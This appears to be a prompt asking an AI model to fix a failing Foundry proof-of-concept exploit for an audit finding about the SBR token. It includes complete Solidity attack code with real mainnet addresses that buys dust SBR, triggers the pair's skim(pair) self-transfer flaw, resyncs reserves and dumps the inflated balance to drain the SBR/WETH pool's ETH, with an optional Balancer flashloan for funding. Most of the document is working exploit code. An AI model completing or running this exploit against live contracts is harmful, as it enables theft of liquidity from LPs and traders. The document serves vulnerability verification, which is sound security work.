You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pair self-transfer via `skim(pair)` appears to inflate SBR balances and enables AMM liquidity theft
- claim: The provided exploit harness shows an attacker can buy only a dust amount of SBR, call `UniswapV2Pair.skim(UniswapV2Pair)`, then observe a very large SBR balance before selling it back through the pool. This supports a token-accounting flaw in SBR that is triggered by the pair transferring tokens to itself during `skim(pair)`, causing balances to be created or duplicated at negligible cost. The subsequent `transfer(..., 1)` and `sync()` steps let the attacker align pool reserves with the manipulated token balance and realize the fabricated balance against the paired asset.
- impact: An external attacker can manufacture a large sellable SBR position from negligible capital and dump it into the SBR/WETH pool, draining most or all of the paired ETH liquidity, collapsing the market, and inflicting direct loss on LPs and traders.
- exploit_paths: ["Swap a dust amount of ETH for SBR", "Call `UniswapV2Pair.skim(UniswapV2Pair)` so the pair performs a self-transfer", "Leverage the resulting inflated SBR balance held by the attacker", "Transfer a dust token amount to the pair and call `sync()` to update reserves", "Swap the inflated SBR balance back to WETH/ETH and extract pool liquidity"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function skim(address to) external;
    function sync() external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    address internal constant SBR = 0x460B1AE257118Ed6F63Ed8489657588a326a206D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V2_PAIR = 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant DUST_ETH_IN = 4_000;
    uint256 internal constant FLASHLOAN_WETH = DUST_ETH_IN;

    address internal lastProfitToken;
    uint256 internal lastProfitAmount;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 nativeBefore = address(this).balance;
        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));

        if (nativeBefore >= DUST_ETH_IN) {
            _runExploitPath(DUST_ETH_IN);
        } else {
            _fundWithMinimalFlashloanAndRun();
        }

        uint256 nativeAfter = address(this).balance;
        uint256 nativeProfit = nativeAfter > nativeBefore ? nativeAfter - nativeBefore : 0;

        if (nativeProfit > 0) {
            // Accounting-only step: wrap realized ETH profit into existing on-chain WETH
            // so profitToken() points to a real, pre-existing token without changing exploit causality.
            IWETH(WETH).deposit{value: nativeProfit}();
        }

        uint256 wethAfter = IERC20(WETH).balanceOf(address(this));
        lastProfitToken = WETH;
        lastProfitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
        require(lastProfitAmount > 0, "no net profit");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "unauthorized flashloan callback");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected flashloan shape");
        require(address(tokens[0]) == WETH, "unexpected flashloan token");

        IWETH(WETH).withdraw(amounts[0]);

        // Minimal public funding is only used if the verifier starts without enough ETH.
        // The exploit path itself remains unchanged: buy dust SBR, trigger skim(pair),
        // realign reserves with transfer+sync, then dump the manipulated SBR balance.
        _runExploitPath(DUST_ETH_IN);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(address(this).balance >= repayment, "cannot repay flashloan");

        IWETH(WETH).deposit{value: repayment}();
        _safeTransfer(WETH, BALANCER_VAULT, repayment);
    }

    function profitToken() external view returns (address) {
        return lastProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return lastProfitAmount;
    }

    function _fundWithMinimalFlashloanAndRun() internal {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASHLOAN_WETH;

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
    }

    function _runExploitPath(uint256 ethToSpend) internal {
        uint256 deadline = block.timestamp + 300;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = SBR;

        // exploit_paths[0]: Swap a dust amount of ETH for SBR.
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethToSpend}(
            0,
            path,
            address(this),
            deadline
        );

        // exploit_paths[1]: Call skim(pair) so the pair performs a self-transfer.
        IUniswapV2Pair(UNISWAP_V2_PAIR).skim(UNISWAP_V2_PAIR);

        // exploit_paths[2]: Leverage the resulting inflated SBR balance held by the attacker.
        uint256 inflatedBalance = IERC20(SBR).balanceOf(address(this));
        require(inflatedBalance > 1, "self-transfer did not inflate attacker balance");

        // exploit_paths[3]: Transfer a dust token amount to the pair and call sync() to update reserves.
        _safeTransfer(SBR, UNISWAP_V2_PAIR, 1);
        IUniswapV2Pair(UNISWAP_V2_PAIR).sync();

        uint256 sellAmount = IERC20(SBR).balanceOf(address(this));
        require(sellAmount > 0, "no manipulated SBR left to dump");
        _forceApprove(SBR, UNISWAP_V2_ROUTER, type(uint256).max);

        path[0] = SBR;
        path[1] = WETH;

        // exploit_paths[4]: Swap the inflated SBR balance back to WETH/ETH and extract pool liquidity.
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            address(this),
            deadline
        );
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount))) {
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _requireOptionalReturn(token, abi.encodeWithSelector(0xa9059cbb, to, amount));
    }

    function _requireOptionalReturn(address token, bytes memory data) internal {
        require(_callOptionalReturn(token, data), "token call failed");
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        if (!success) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length == 32) {
            return abi.decode(returndata, (bool));
        }
        return false;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
